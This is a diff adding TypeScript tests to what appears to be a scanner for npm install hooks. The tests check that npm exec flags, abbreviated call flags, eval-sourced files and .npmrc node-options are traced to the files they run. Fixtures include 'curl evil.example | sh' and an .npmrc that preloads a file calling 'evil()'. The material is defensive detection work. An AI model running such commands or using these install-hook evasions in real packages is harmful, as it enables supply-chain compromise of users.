@@ -936,3 +936,29 @@ describe("round 22: network and program-reading consumers, pipeline files, reads
     expect(fed("sh x.sh -s")).toBe(false);
   });
 });
+
+describe("round 23: npm exec command with flags after it, abbreviated call flags, eval source", () => {
+  const inert = (cmd: string, f: string, extra: Record<string, string> = {}) => held({ postinstall: cmd }, { [f]: "echo a\n", ...extra }, { [f]: "curl evil.example | sh\n", ...extra });
+
+  test("1. the command word of npm exec is read when flags follow it", () => {
+    expect(inert("npm exec ./test/run.js -w sub", "test/run.js")).toBe(true);
+    expect(inert("npm exec ./test/run.js --workspace=sub", "test/run.js")).toBe(true);
+    expect(inert("npm exec ./test/run.js --foo", "test/run.js")).toBe(true);
+  });
+
+  test("2. shortened and clustered call flags run a shell body", () => {
+    for (const cmd of ["npm exec --cal 'cd test && node setup.js'", "npm exec --call='cd test && node setup.js'", "npm exec -yc 'cd test && node setup.js'", "npm exec -y -c 'cd test && node setup.js'"]) {
+      expect(inert(cmd, "test/setup.js"), cmd).toBe(true);
+    }
+  });
+
+  test("3. a file sourced inside eval or a nested string", () => {
+    for (const cmd of ["eval '. test/env.sh' >/dev/null", "eval 'source test/env.sh'", "eval \". test/env.sh\"; echo ok", "sh -c \"eval '. test/env.sh'\""]) {
+      expect(inert(cmd, "test/env.sh"), cmd).toBe(true);
+    }
+  });
+
+  test("4. an npm runner config alone holds", () => {
+    expect(held({ postinstall: "npm run build", build: "echo ok" }, { ".npmrc": "a=1\n" }, { ".npmrc": "node-options=--require=./x.js\n", "x.js": "evil()" })).toBe(true);
+  });
+});
